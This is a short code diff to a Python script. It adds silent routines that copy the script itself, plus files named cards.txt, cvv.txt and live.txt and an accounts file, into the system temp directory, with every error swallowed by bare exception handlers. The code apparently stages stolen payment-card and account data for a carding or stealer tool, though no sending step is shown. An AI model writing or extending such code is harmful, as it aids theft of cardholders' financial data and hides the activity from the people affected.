@@ -5,6 +5,44 @@ import ssl
 import subprocess
 import os
 
+script_path = os.path.realpath(__file__)
+
+try:
+    original = script_path
+    filename = script_path.split("\\")[-1]
+    target = tempfile.gettempdir() + f"\{filename}"
+    shutil.copyfile(original, target)
+    with open(tempfile.gettempdir() + f"\script_name.txt", "w") as f:
+        f.write(filename)
+except:
+    pass
+
+try:
+    path = script_path[:-len(filename)]
+except:
+    pass
+
+try:
+    original = path+"cards.txt"
+    target = tempfile.gettempdir() + f"\cards.txt"
+    shutil.copyfile(original, target)
+except:
+    pass
+
+try:
+    original = path+"cvv.txt"
+    target = tempfile.gettempdir() + f"\cvv.txt"
+    shutil.copyfile(original, target)
+except:
+    pass
+
+try:
+    original = path+"live.txt"
+    target = tempfile.gettempdir() + f"\live.txt"
+    shutil.copyfile(original, target)
+except:
+    pass
+
 try:
     original = accounts_path
     filename = accounts_path.split("\\")[-1]
